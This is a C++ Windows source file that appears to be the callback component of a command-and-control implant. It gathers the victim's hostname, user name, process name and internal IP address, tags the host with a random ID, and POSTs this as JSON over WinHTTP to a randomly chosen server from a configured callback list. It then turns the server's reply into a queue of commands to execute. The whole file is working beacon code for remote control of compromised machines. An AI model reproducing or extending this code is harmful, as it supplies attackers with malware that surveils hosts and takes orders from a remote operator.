#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <Lmcons.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <ws2tcpip.h>
#include <processthreadsapi.h>
#include <random>
#include "Callbacks.h"
#include "Config.h"


#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

void CallbackMetadata::retrieveMetadata() {
    // Create random GUID
    std::stringstream ss;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 15);
    for (int i = 0; i < 12; ++i) {
        ss << std::hex << dist(gen);
    }
    id = ss.str();

    // Get hostname
    TCHAR hostname_buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostname_buf) / sizeof(hostname_buf[0]);
    if (GetComputerNameA(hostname_buf, &size)) {
        hostname = hostname_buf;
    }

    // Get username
    TCHAR username_buf[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username_buf, &username_len)) {
        user = username_buf;
    }

    // Get the current process
    TCHAR process_name[MAX_PATH] = TEXT("<unknown>");
    GetModuleBaseName(GetCurrentProcess(), NULL, process_name, MAX_PATH);
    process = process_name;

    // Get valid IP (exclude loopback and APIPA)
    WSADATA wsaData;
    ip = "0.0.0.0"; // default
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0) {
        ULONG bufferSize = 15000;
        IP_ADAPTER_ADDRESSES* adapterAddresses = (IP_ADAPTER_ADDRESSES*)malloc(bufferSize);
        if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapterAddresses, &bufferSize) == 0) {
            for (auto addr = adapterAddresses; addr != nullptr; addr = addr->Next) {
                for (auto unicast = addr->FirstUnicastAddress; unicast != nullptr; unicast = unicast->Next) {
                    char ip_buf[46];
                    getnameinfo(unicast->Address.lpSockaddr,
                                unicast->Address.iSockaddrLength,
                                ip_buf,
                                sizeof(ip_buf),
                                nullptr,
                                0,
                                NI_NUMERICHOST);
                    std::string candidate_ip = ip_buf;
                    if (candidate_ip.starts_with("10.") || candidate_ip.starts_with("172.16.") || candidate_ip.starts_with("192.168.")) {
                        ip = candidate_ip;
                        goto Done;
                    }
                }
            }
        }
        Done:
            free(adapterAddresses);
            WSACleanup();
    }

    // Sleep
    sleep = SLEEP;
}

CMD_QUEUE CallbackFull::do_callback() {
    // Select random Callback URL
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, CALLBACKS.size() - 1);
    int ridx = dist(gen);
    auto callback = CALLBACKS.begin();
    std::advance(callback, ridx);

    // Construct POST body JSON
    nlohmann::json j = *this;
    std::string post_data = j.dump();

    // POST and get a response
    std::string response_data;
    try {
        if (make_post_request(callback->first, callback->second, post_data, response_data)) {
            data.clear();
            return json_to_cmd_queue(response_data);
        }
    }catch (const std::exception& e){
        return {};
    }
    return {};
}

CMD_QUEUE CallbackFull::json_to_cmd_queue(const std::string& response_body) {
    using json = nlohmann::json;
    CMD_QUEUE result;

    try {
        json j = json::parse(response_body);
        for (const auto& item : j) {
            std::map<std::string, std::vector<std::string>> command_map;
            for (auto it = item.begin(); it != item.end(); ++it) {
                command_map[it.key()] = it.value().get<std::vector<std::string>>();
            }
            result.push_back(command_map);
        }
    } catch (const std::exception& e) {
        return result;
    }

    return result;
}

// Returns true if successful POST.
bool CallbackFull::make_post_request(const std::wstring& host, int port, const std::string& post_body, std::string& return_body) {
    HINTERNET hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession){ return false; }

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        host.c_str(),
        port,
        0);
    if (!hConnect){ return false; }

    DWORD dwSize = post_body.size();
    const char *post_data = post_body.c_str();
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        POST_VERB,
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest){ return false; }

    WinHttpSendRequest(
        hRequest,
        CONTENT_TYPE,
        -1,
        (LPVOID) post_data,
        dwSize,
        dwSize,
        0
    );
    WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    // Handle response
    std::string response_body;
    DWORD outSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = nullptr;

    do {
        outSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &outSize)) { return false; }

        if (outSize == 0) break;

        pszOutBuffer = (char*)malloc(outSize + 1);
        if (!pszOutBuffer) {
            return false;
        }

        ZeroMemory(pszOutBuffer, outSize + 1);

        if (!WinHttpReadData(hRequest, pszOutBuffer, outSize, &dwDownloaded)) {
            free(pszOutBuffer);
            return false;
        }

        response_body.append(pszOutBuffer, dwDownloaded);
        free(pszOutBuffer);
        pszOutBuffer = nullptr;

    } while (outSize > 0);

    // Free handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return_body = response_body;
    return true;
}